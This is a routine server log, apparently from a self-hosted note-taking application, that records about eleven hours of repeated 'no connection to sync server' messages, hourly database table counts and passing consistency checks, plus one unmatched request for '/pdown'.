13:07:39.946 No connection to sync server.
13:08:39.955 No connection to sync server.
13:09:39.959 No connection to sync server.
13:10:39.974 No connection to sync server.
13:11:39.971 No connection to sync server.
13:12:39.981 No connection to sync server.
13:13:39.982 No connection to sync server.
13:14:39.985 No connection to sync server.
13:15:22.342 Error: Router not found for request GET /pdown
13:15:39.994 No connection to sync server.
13:16:39.995 No connection to sync server.
13:17:06.765 Table counts: notes: 308, revisions: 122, attachments: 66, branches: 311, attributes: 457, etapi_tokens: 0, blobs: 333
13:17:06.783 All consistency checks passed with no errors detected (took 19ms)
13:17:40.008 No connection to sync server.
13:18:40.017 No connection to sync server.
13:19:40.020 No connection to sync server.
13:20:40.022 No connection to sync server.
13:21:40.028 No connection to sync server.
13:22:40.033 No connection to sync server.
13:23:40.045 No connection to sync server.
13:24:40.032 No connection to sync server.
13:25:40.053 No connection to sync server.
13:26:40.054 No connection to sync server.
13:27:40.059 No connection to sync server.
13:28:40.061 No connection to sync server.
13:29:40.077 No connection to sync server.
13:30:40.080 No connection to sync server.
13:31:40.092 No connection to sync server.
13:32:40.093 No connection to sync server.
13:33:40.092 No connection to sync server.
13:34:40.106 No connection to sync server.
13:35:40.116 No connection to sync server.
13:36:40.101 No connection to sync server.
13:37:40.103 No connection to sync server.
13:38:40.112 No connection to sync server.
13:39:40.115 No connection to sync server.
13:40:40.130 No connection to sync server.
13:41:40.123 No connection to sync server.
13:42:40.140 No connection to sync server.
13:43:40.145 No connection to sync server.
13:44:40.146 No connection to sync server.
13:45:40.155 No connection to sync server.
13:46:40.154 No connection to sync server.
13:47:40.159 No connection to sync server.
13:48:40.176 No connection to sync server.
13:49:40.170 No connection to sync server.
13:50:40.169 No connection to sync server.
13:51:40.168 No connection to sync server.
13:52:40.186 No connection to sync server.
13:53:40.184 No connection to sync server.
13:54:40.194 No connection to sync server.
13:55:40.209 No connection to sync server.
13:56:40.197 No connection to sync server.
13:57:40.206 No connection to sync server.
13:58:40.219 No connection to sync server.
13:59:40.221 No connection to sync server.
14:00:40.213 No connection to sync server.
14:01:40.218 No connection to sync server.
14:02:40.225 No connection to sync server.
14:03:40.230 No connection to sync server.
14:04:40.227 No connection to sync server.
14:05:40.238 No connection to sync server.
14:06:40.237 No connection to sync server.
14:07:40.242 No connection to sync server.
14:08:40.255 No connection to sync server.
14:09:40.267 No connection to sync server.
14:10:40.270 No connection to sync server.
14:11:40.271 No connection to sync server.
14:12:40.274 No connection to sync server.
14:13:40.273 No connection to sync server.
14:14:40.282 No connection to sync server.
14:15:40.293 No connection to sync server.
14:16:40.287 No connection to sync server.
14:17:06.766 Table counts: notes: 308, revisions: 122, attachments: 66, branches: 311, attributes: 457, etapi_tokens: 0, blobs: 333
14:17:06.784 All consistency checks passed with no errors detected (took 19ms)
14:17:40.291 No connection to sync server.
14:18:40.299 No connection to sync server.
14:19:40.308 No connection to sync server.
14:20:40.312 No connection to sync server.
14:21:40.313 No connection to sync server.
14:22:40.319 No connection to sync server.
14:23:40.324 No connection to sync server.
14:24:40.320 No connection to sync server.
14:25:40.328 No connection to sync server.
14:26:40.335 No connection to sync server.
14:27:40.353 No connection to sync server.
14:28:40.346 No connection to sync server.
14:29:40.345 No connection to sync server.
14:30:40.338 No connection to sync server.
14:31:40.348 No connection to sync server.
14:32:40.355 No connection to sync server.
14:33:40.366 No connection to sync server.
14:34:40.359 No connection to sync server.
14:35:40.428 No connection to sync server.
14:36:40.372 No connection to sync server.
14:37:40.393 No connection to sync server.
14:38:40.375 No connection to sync server.
14:39:40.387 No connection to sync server.
14:40:40.386 No connection to sync server.
14:41:40.394 No connection to sync server.
14:42:40.425 No connection to sync server.
14:43:40.395 No connection to sync server.
14:44:40.403 No connection to sync server.
14:45:40.409 No connection to sync server.
14:46:40.412 No connection to sync server.
14:47:40.419 No connection to sync server.
14:48:40.416 No connection to sync server.
14:49:40.423 No connection to sync server.
14:50:40.423 No connection to sync server.
14:51:40.450 No connection to sync server.
14:52:40.444 No connection to sync server.
14:53:40.442 No connection to sync server.
14:54:40.438 No connection to sync server.
14:55:40.454 No connection to sync server.
14:56:40.450 No connection to sync server.
14:57:40.450 No connection to sync server.
14:58:40.462 No connection to sync server.
14:59:40.467 No connection to sync server.
15:00:40.907 No connection to sync server.
15:01:40.471 No connection to sync server.
15:02:40.470 No connection to sync server.
15:03:40.477 No connection to sync server.
15:04:40.476 No connection to sync server.
15:05:40.482 No connection to sync server.
15:06:40.484 No connection to sync server.
15:07:40.498 No connection to sync server.
15:08:40.491 No connection to sync server.
15:09:40.500 No connection to sync server.
15:10:40.501 No connection to sync server.
15:11:40.504 No connection to sync server.
15:12:40.500 No connection to sync server.
15:13:40.514 No connection to sync server.
15:14:40.511 No connection to sync server.
15:15:40.506 No connection to sync server.
15:16:40.522 No connection to sync server.
15:17:06.770 Table counts: notes: 308, revisions: 122, attachments: 66, branches: 311, attributes: 457, etapi_tokens: 0, blobs: 333
15:17:06.790 All consistency checks passed with no errors detected (took 20ms)
15:17:40.523 No connection to sync server.
15:18:40.534 No connection to sync server.
15:19:40.529 No connection to sync server.
15:20:40.523 No connection to sync server.
15:21:40.531 No connection to sync server.
15:22:40.535 No connection to sync server.
15:23:40.540 No connection to sync server.
15:24:40.532 No connection to sync server.
15:25:40.546 No connection to sync server.
15:26:40.549 No connection to sync server.
15:27:40.545 No connection to sync server.
15:28:40.552 No connection to sync server.
15:29:40.549 No connection to sync server.
15:30:40.567 No connection to sync server.
15:31:40.565 No connection to sync server.
15:32:40.550 No connection to sync server.
15:33:40.555 No connection to sync server.
15:34:40.551 No connection to sync server.
15:35:40.562 No connection to sync server.
15:36:40.570 No connection to sync server.
15:37:40.568 No connection to sync server.
15:38:40.574 No connection to sync server.
15:39:40.570 No connection to sync server.
15:40:40.570 No connection to sync server.
15:41:40.573 No connection to sync server.
15:42:40.579 No connection to sync server.
15:43:40.580 No connection to sync server.
15:44:40.582 No connection to sync server.
15:45:40.576 No connection to sync server.
15:46:40.588 No connection to sync server.
15:47:40.582 No connection to sync server.
15:48:40.584 No connection to sync server.
15:49:40.591 No connection to sync server.
15:50:40.707 No connection to sync server.
15:51:40.584 No connection to sync server.
15:52:40.598 No connection to sync server.
15:53:40.602 No connection to sync server.
15:54:40.597 No connection to sync server.
15:55:40.590 No connection to sync server.
15:56:40.607 No connection to sync server.
15:57:40.603 No connection to sync server.
15:58:40.596 No connection to sync server.
15:59:40.597 No connection to sync server.
16:00:40.592 No connection to sync server.
16:01:40.603 No connection to sync server.
16:02:40.597 No connection to sync server.
16:03:40.600 No connection to sync server.
16:04:40.610 No connection to sync server.
16:05:40.614 No connection to sync server.
16:06:40.614 No connection to sync server.
16:07:40.605 No connection to sync server.
16:08:40.672 No connection to sync server.
16:09:40.607 No connection to sync server.
16:10:40.609 No connection to sync server.
16:11:40.614 No connection to sync server.
16:12:40.614 No connection to sync server.
16:13:40.605 No connection to sync server.
16:14:40.608 No connection to sync server.
16:15:40.615 No connection to sync server.
16:16:40.613 No connection to sync server.
16:17:06.773 Table counts: notes: 308, revisions: 122, attachments: 66, branches: 311, attributes: 457, etapi_tokens: 0, blobs: 333
16:17:06.795 All consistency checks passed with no errors detected (took 23ms)
16:17:40.623 No connection to sync server.
16:18:40.639 No connection to sync server.
16:19:40.649 No connection to sync server.
16:20:40.677 No connection to sync server.
16:21:40.692 No connection to sync server.
16:22:40.715 No connection to sync server.
16:23:40.724 No connection to sync server.
16:24:40.738 No connection to sync server.
16:25:40.770 No connection to sync server.
16:26:40.779 No connection to sync server.
16:27:40.784 No connection to sync server.
16:28:40.803 No connection to sync server.
16:29:40.819 No connection to sync server.
16:30:40.842 No connection to sync server.
16:31:40.858 No connection to sync server.
16:32:40.876 No connection to sync server.
16:33:40.900 No connection to sync server.
16:34:40.911 No connection to sync server.
16:35:40.927 No connection to sync server.
16:36:40.947 No connection to sync server.
16:37:40.963 No connection to sync server.
16:38:40.973 No connection to sync server.
16:39:40.989 No connection to sync server.
16:40:41.017 No connection to sync server.
16:41:41.022 No connection to sync server.
16:42:41.037 No connection to sync server.
16:43:41.055 No connection to sync server.
16:44:41.070 No connection to sync server.
16:45:41.077 No connection to sync server.
16:46:41.109 No connection to sync server.
16:47:41.107 No connection to sync server.
16:48:41.140 No connection to sync server.
16:49:41.146 No connection to sync server.
16:50:41.160 No connection to sync server.
16:51:41.171 No connection to sync server.
16:52:41.188 No connection to sync server.
16:53:41.209 No connection to sync server.
16:54:41.224 No connection to sync server.
16:55:41.245 No connection to sync server.
16:56:41.253 No connection to sync server.
16:57:41.255 No connection to sync server.
16:58:41.294 No connection to sync server.
16:59:41.291 No connection to sync server.
17:00:41.321 No connection to sync server.
17:01:41.316 No connection to sync server.
17:02:41.352 No connection to sync server.
17:03:41.360 No connection to sync server.
17:04:41.359 No connection to sync server.
17:05:41.362 No connection to sync server.
17:06:41.379 No connection to sync server.
17:07:41.394 No connection to sync server.
17:08:41.407 No connection to sync server.
17:09:41.426 No connection to sync server.
17:10:41.431 No connection to sync server.
17:11:41.453 No connection to sync server.
17:12:41.458 No connection to sync server.
17:13:47.524 No connection to sync server.
17:14:41.494 No connection to sync server.
17:15:41.523 No connection to sync server.
17:16:41.525 No connection to sync server.
17:17:06.776 Table counts: notes: 308, revisions: 122, attachments: 66, branches: 311, attributes: 457, etapi_tokens: 0, blobs: 333
17:17:06.798 All consistency checks passed with no errors detected (took 23ms)
17:17:41.549 No connection to sync server.
17:18:41.565 No connection to sync server.
17:19:41.589 No connection to sync server.
17:20:46.593 No connection to sync server.
17:21:41.616 No connection to sync server.
17:22:41.622 No connection to sync server.
17:23:41.654 No connection to sync server.
17:24:41.653 No connection to sync server.
17:25:41.676 No connection to sync server.
17:26:41.683 No connection to sync server.
17:27:41.713 No connection to sync server.
17:28:41.700 No connection to sync server.
17:29:41.707 No connection to sync server.
17:30:41.718 No connection to sync server.
17:31:41.719 No connection to sync server.
17:32:41.727 No connection to sync server.
17:33:41.752 No connection to sync server.
17:34:41.757 No connection to sync server.
17:35:41.789 No connection to sync server.
17:36:41.779 No connection to sync server.
17:37:41.821 No connection to sync server.
17:38:41.816 No connection to sync server.
17:39:41.856 No connection to sync server.
17:40:41.855 No connection to sync server.
17:41:41.873 No connection to sync server.
17:42:41.879 No connection to sync server.
17:43:41.911 No connection to sync server.
17:44:41.911 No connection to sync server.
17:45:41.909 No connection to sync server.
17:46:41.948 No connection to sync server.
17:47:41.942 No connection to sync server.
17:48:41.974 No connection to sync server.
17:49:41.975 No connection to sync server.
17:50:42.014 No connection to sync server.
17:51:42.011 No connection to sync server.
17:52:42.037 No connection to sync server.
17:53:42.046 No connection to sync server.
17:54:42.064 No connection to sync server.
17:55:42.071 No connection to sync server.
17:56:42.102 No connection to sync server.
17:57:42.104 No connection to sync server.
17:58:42.128 No connection to sync server.
17:59:42.143 No connection to sync server.
18:00:42.182 No connection to sync server.
18:01:42.172 No connection to sync server.
18:02:42.201 No connection to sync server.
18:03:42.203 No connection to sync server.
18:04:42.246 No connection to sync server.
18:05:42.226 No connection to sync server.
18:06:42.251 No connection to sync server.
18:07:42.261 No connection to sync server.
18:08:42.288 No connection to sync server.
18:09:42.301 No connection to sync server.
18:10:42.326 No connection to sync server.
18:11:42.331 No connection to sync server.
18:12:42.356 No connection to sync server.
18:13:42.364 No connection to sync server.
18:14:42.390 No connection to sync server.
18:15:42.394 No connection to sync server.
18:16:42.403 No connection to sync server.
18:17:06.632 Optimizing database
18:17:06.633 Optimization finished in 1ms.
18:17:06.776 Table counts: notes: 308, revisions: 122, attachments: 66, branches: 311, attributes: 457, etapi_tokens: 0, blobs: 333
18:17:06.795 All consistency checks passed with no errors detected (took 19ms)
18:17:42.407 No connection to sync server.
18:18:42.437 No connection to sync server.
18:19:42.447 No connection to sync server.
18:20:42.474 No connection to sync server.
18:21:42.482 No connection to sync server.
18:22:42.503 No connection to sync server.
18:23:42.513 No connection to sync server.
18:24:42.536 No connection to sync server.
18:25:42.540 No connection to sync server.
18:26:42.563 No connection to sync server.
18:27:42.566 No connection to sync server.
18:28:42.599 No connection to sync server.
18:29:42.597 No connection to sync server.
18:30:42.643 No connection to sync server.
18:31:42.639 No connection to sync server.
18:32:42.647 No connection to sync server.
18:33:42.649 No connection to sync server.
18:34:42.668 No connection to sync server.
18:35:42.682 No connection to sync server.
18:36:42.701 No connection to sync server.
18:37:42.707 No connection to sync server.
18:38:42.732 No connection to sync server.
18:39:42.738 No connection to sync server.
18:40:42.762 No connection to sync server.
18:41:42.780 No connection to sync server.
18:42:42.805 No connection to sync server.
18:43:42.792 No connection to sync server.
18:44:42.829 No connection to sync server.
18:45:42.834 No connection to sync server.
18:46:42.866 No connection to sync server.
18:47:42.859 No connection to sync server.
18:48:42.890 No connection to sync server.
18:49:42.889 No connection to sync server.
18:50:42.918 No connection to sync server.
18:51:42.930 No connection to sync server.
18:52:42.942 No connection to sync server.
18:53:42.953 No connection to sync server.
18:54:42.986 No connection to sync server.
18:55:42.988 No connection to sync server.
18:56:43.017 No connection to sync server.
18:57:43.014 No connection to sync server.
18:58:43.025 No connection to sync server.
18:59:43.037 No connection to sync server.
19:00:43.057 No connection to sync server.
19:01:43.061 No connection to sync server.
19:02:43.095 No connection to sync server.
19:03:43.086 No connection to sync server.
19:04:43.096 No connection to sync server.
19:05:43.128 No connection to sync server.
19:06:43.141 No connection to sync server.
19:07:43.157 No connection to sync server.
19:08:43.175 No connection to sync server.
19:09:43.170 No connection to sync server.
19:10:43.186 No connection to sync server.
19:11:43.208 No connection to sync server.
19:12:43.216 No connection to sync server.
19:13:43.233 No connection to sync server.
19:14:43.245 No connection to sync server.
19:15:43.252 No connection to sync server.
19:16:43.254 No connection to sync server.
19:17:06.780 Table counts: notes: 308, revisions: 122, attachments: 66, branches: 311, attributes: 457, etapi_tokens: 0, blobs: 333
19:17:06.800 All consistency checks passed with no errors detected (took 21ms)
19:17:43.253 No connection to sync server.
19:18:43.284 No connection to sync server.
19:19:43.287 No connection to sync server.
19:20:43.311 No connection to sync server.
19:21:43.333 No connection to sync server.
19:22:43.333 No connection to sync server.
19:23:43.349 No connection to sync server.
19:24:43.360 No connection to sync server.
19:25:43.381 No connection to sync server.
19:26:43.396 No connection to sync server.
19:27:43.416 No connection to sync server.
19:28:43.422 No connection to sync server.
19:29:43.442 No connection to sync server.
19:30:43.450 No connection to sync server.
19:31:43.480 No connection to sync server.
19:32:43.483 No connection to sync server.
19:33:43.490 No connection to sync server.
19:34:43.520 No connection to sync server.
19:35:43.523 No connection to sync server.
19:36:43.542 No connection to sync server.
19:37:43.548 No connection to sync server.
19:38:43.577 No connection to sync server.
19:39:43.576 No connection to sync server.
19:40:43.601 No connection to sync server.
19:41:43.620 No connection to sync server.
19:42:43.610 No connection to sync server.
19:43:43.634 No connection to sync server.
19:44:43.643 No connection to sync server.
19:45:43.652 No connection to sync server.
19:46:43.680 No connection to sync server.
19:47:43.683 No connection to sync server.
19:48:43.707 No connection to sync server.
19:49:43.709 No connection to sync server.
19:50:43.728 No connection to sync server.
19:51:43.743 No connection to sync server.
19:52:43.765 No connection to sync server.
19:53:43.766 No connection to sync server.
19:54:43.795 No connection to sync server.
19:55:43.792 No connection to sync server.
19:56:43.825 No connection to sync server.
19:57:43.824 No connection to sync server.
19:58:43.857 No connection to sync server.
19:59:43.849 No connection to sync server.
20:00:43.877 No connection to sync server.
20:01:43.883 No connection to sync server.
20:02:43.894 No connection to sync server.
20:03:43.904 No connection to sync server.
20:04:43.925 No connection to sync server.
20:05:43.939 No connection to sync server.
20:06:43.953 No connection to sync server.
20:07:43.965 No connection to sync server.
20:08:43.961 No connection to sync server.
20:09:43.974 No connection to sync server.
20:10:43.987 No connection to sync server.
20:11:43.995 No connection to sync server.
20:12:44.040 No connection to sync server.
20:13:44.023 No connection to sync server.
20:14:44.060 No connection to sync server.
20:15:44.059 No connection to sync server.
20:16:44.069 No connection to sync server.
20:17:06.782 Table counts: notes: 308, revisions: 122, attachments: 66, branches: 311, attributes: 457, etapi_tokens: 0, blobs: 333
20:17:06.796 All consistency checks passed with no errors detected (took 14ms)
20:17:44.089 No connection to sync server.
20:18:44.102 No connection to sync server.
20:19:44.124 No connection to sync server.
20:20:44.124 No connection to sync server.
20:21:44.154 No connection to sync server.
20:22:44.155 No connection to sync server.
20:23:44.175 No connection to sync server.
20:24:44.185 No connection to sync server.
20:25:44.199 No connection to sync server.
20:26:44.215 No connection to sync server.
20:27:44.224 No connection to sync server.
20:28:44.240 No connection to sync server.
20:29:44.243 No connection to sync server.
20:30:44.265 No connection to sync server.
20:31:44.273 No connection to sync server.
20:32:44.306 No connection to sync server.
20:33:44.307 No connection to sync server.
20:34:44.335 No connection to sync server.
20:35:44.339 No connection to sync server.
20:36:44.355 No connection to sync server.
20:37:44.358 No connection to sync server.
20:38:44.385 No connection to sync server.
20:39:44.390 No connection to sync server.
20:40:44.408 No connection to sync server.
20:41:44.420 No connection to sync server.
20:42:44.452 No connection to sync server.
20:43:44.444 No connection to sync server.
20:44:44.478 No connection to sync server.
20:45:44.474 No connection to sync server.
20:46:44.512 No connection to sync server.
20:47:44.516 No connection to sync server.
20:48:44.533 No connection to sync server.
20:49:44.543 No connection to sync server.
20:50:44.556 No connection to sync server.
20:51:44.575 No connection to sync server.
20:52:44.587 No connection to sync server.
20:53:44.610 No connection to sync server.
20:54:44.620 No connection to sync server.
20:55:44.635 No connection to sync server.
20:56:44.643 No connection to sync server.
20:57:44.664 No connection to sync server.
20:58:44.673 No connection to sync server.
20:59:44.693 No connection to sync server.
21:00:44.709 No connection to sync server.
21:01:44.720 No connection to sync server.
21:02:44.728 No connection to sync server.
21:03:44.758 No connection to sync server.
21:04:44.773 No connection to sync server.
21:05:44.783 No connection to sync server.
21:06:44.796 No connection to sync server.
21:07:44.798 No connection to sync server.
21:08:44.826 No connection to sync server.
21:09:44.837 No connection to sync server.
21:10:44.852 No connection to sync server.
21:11:44.854 No connection to sync server.
21:12:44.881 No connection to sync server.
21:13:44.889 No connection to sync server.
21:14:44.911 No connection to sync server.
21:15:44.923 No connection to sync server.
21:16:44.936 No connection to sync server.
21:17:06.784 Table counts: notes: 308, revisions: 122, attachments: 66, branches: 311, attributes: 457, etapi_tokens: 0, blobs: 333
21:17:06.802 All consistency checks passed with no errors detected (took 19ms)
21:17:44.946 No connection to sync server.
21:18:44.946 No connection to sync server.
21:19:44.965 No connection to sync server.
21:20:44.976 No connection to sync server.
21:21:44.989 No connection to sync server.
21:22:44.999 No connection to sync server.
21:23:45.020 No connection to sync server.
21:24:45.027 No connection to sync server.
21:25:45.036 No connection to sync server.
21:26:45.059 No connection to sync server.
21:27:45.073 No connection to sync server.
21:28:45.088 No connection to sync server.
21:29:45.099 No connection to sync server.
21:30:45.124 No connection to sync server.
21:31:45.129 No connection to sync server.
21:32:45.148 No connection to sync server.
21:33:45.163 No connection to sync server.
21:34:45.172 No connection to sync server.
21:35:45.182 No connection to sync server.
21:36:45.200 No connection to sync server.
21:37:45.206 No connection to sync server.
21:38:45.235 No connection to sync server.
21:39:45.238 No connection to sync server.
21:40:45.271 No connection to sync server.
21:41:45.263 No connection to sync server.
21:42:45.285 No connection to sync server.
21:43:45.296 No connection to sync server.
21:44:45.294 No connection to sync server.
21:45:45.327 No connection to sync server.
21:46:45.320 No connection to sync server.
21:47:45.363 No connection to sync server.
21:48:45.352 No connection to sync server.
21:49:45.381 No connection to sync server.
21:50:45.373 No connection to sync server.
21:51:45.408 No connection to sync server.
21:52:45.402 No connection to sync server.
21:53:45.427 No connection to sync server.
21:54:45.435 No connection to sync server.
21:55:45.467 No connection to sync server.
21:56:45.466 No connection to sync server.
21:57:45.491 No connection to sync server.
21:58:45.494 No connection to sync server.
21:59:45.518 No connection to sync server.
22:00:45.524 No connection to sync server.
22:01:45.548 No connection to sync server.
22:02:45.553 No connection to sync server.
22:03:45.578 No connection to sync server.
22:04:45.572 No connection to sync server.
22:05:45.592 No connection to sync server.
22:06:45.609 No connection to sync server.
22:07:45.621 No connection to sync server.
22:08:45.631 No connection to sync server.
22:09:45.650 No connection to sync server.
22:10:45.652 No connection to sync server.
22:11:45.673 No connection to sync server.
22:12:45.676 No connection to sync server.
22:13:45.712 No connection to sync server.
22:14:45.700 No connection to sync server.
22:15:45.724 No connection to sync server.
22:16:45.749 No connection to sync server.
22:17:06.783 Table counts: notes: 308, revisions: 122, attachments: 66, branches: 311, attributes: 457, etapi_tokens: 0, blobs: 333
22:17:06.798 All consistency checks passed with no errors detected (took 15ms)
22:17:45.759 No connection to sync server.
22:18:45.769 No connection to sync server.
22:19:45.788 No connection to sync server.
22:20:45.796 No connection to sync server.
22:21:45.812 No connection to sync server.
22:22:45.817 No connection to sync server.
22:23:45.841 No connection to sync server.
22:24:45.844 No connection to sync server.
22:25:45.853 No connection to sync server.
22:26:45.878 No connection to sync server.
22:27:45.889 No connection to sync server.
22:28:45.908 No connection to sync server.
22:29:45.912 No connection to sync server.
22:30:45.925 No connection to sync server.
22:31:45.990 No connection to sync server.
22:32:45.970 No connection to sync server.
22:33:45.979 No connection to sync server.
22:34:45.996 No connection to sync server.
22:35:45.998 No connection to sync server.
22:36:46.018 No connection to sync server.
22:37:46.037 No connection to sync server.
22:38:46.045 No connection to sync server.
22:39:46.062 No connection to sync server.
22:40:46.079 No connection to sync server.
22:41:46.094 No connection to sync server.
22:42:46.122 No connection to sync server.
22:43:46.118 No connection to sync server.
22:44:46.141 No connection to sync server.
22:45:46.147 No connection to sync server.
22:46:46.164 No connection to sync server.
22:47:46.184 No connection to sync server.
22:48:46.196 No connection to sync server.
22:49:46.209 No connection to sync server.
22:50:46.220 No connection to sync server.
22:51:46.218 No connection to sync server.
22:52:46.238 No connection to sync server.
22:53:46.245 No connection to sync server.
22:54:46.273 No connection to sync server.
22:55:46.274 No connection to sync server.
22:56:46.293 No connection to sync server.
22:57:46.301 No connection to sync server.
22:58:46.320 No connection to sync server.
22:59:46.321 No connection to sync server.
23:00:46.355 No connection to sync server.
23:01:46.350 No connection to sync server.
23:02:46.375 No connection to sync server.
23:03:46.373 No connection to sync server.
23:04:46.407 No connection to sync server.
23:05:46.408 No connection to sync server.
23:06:46.428 No connection to sync server.
23:07:46.433 No connection to sync server.
23:08:46.455 No connection to sync server.
23:09:46.460 No connection to sync server.
23:10:46.480 No connection to sync server.
23:11:46.489 No connection to sync server.
23:12:46.509 No connection to sync server.
23:13:46.508 No connection to sync server.
23:14:46.546 No connection to sync server.
23:15:46.555 No connection to sync server.
23:16:46.572 No connection to sync server.
23:17:06.786 Table counts: notes: 308, revisions: 122, attachments: 66, branches: 311, attributes: 457, etapi_tokens: 0, blobs: 333
23:17:06.802 All consistency checks passed with no errors detected (took 16ms)
23:17:46.560 No connection to sync server.
23:18:46.594 No connection to sync server.
23:19:46.593 No connection to sync server.
23:20:46.619 No connection to sync server.
23:21:46.619 No connection to sync server.
23:22:46.646 No connection to sync server.
23:23:46.650 No connection to sync server.
23:24:46.669 No connection to sync server.
23:25:46.672 No connection to sync server.
23:26:46.712 No connection to sync server.
23:27:46.703 No connection to sync server.
23:28:46.736 No connection to sync server.
23:29:46.731 No connection to sync server.
23:30:46.757 No connection to sync server.
23:31:46.773 No connection to sync server.
23:32:46.788 No connection to sync server.
23:33:46.784 No connection to sync server.
23:34:46.817 No connection to sync server.
23:35:46.812 No connection to sync server.
23:36:46.829 No connection to sync server.
23:37:46.835 No connection to sync server.
23:38:46.854 No connection to sync server.
23:39:46.871 No connection to sync server.
23:40:46.891 No connection to sync server.
23:41:46.896 No connection to sync server.
23:42:46.921 No connection to sync server.
23:43:46.923 No connection to sync server.
23:44:46.945 No connection to sync server.
23:45:46.952 No connection to sync server.
23:46:46.981 No connection to sync server.
23:47:46.973 No connection to sync server.
23:48:46.998 No connection to sync server.
23:49:47.007 No connection to sync server.
23:50:47.026 No connection to sync server.
23:51:47.033 No connection to sync server.
23:52:47.045 No connection to sync server.
23:53:47.051 No connection to sync server.
23:54:47.060 No connection to sync server.
23:55:47.077 No connection to sync server.
23:56:47.084 No connection to sync server.
23:57:47.102 No connection to sync server.
23:58:47.105 No connection to sync server.
23:59:47.123 No connection to sync server.
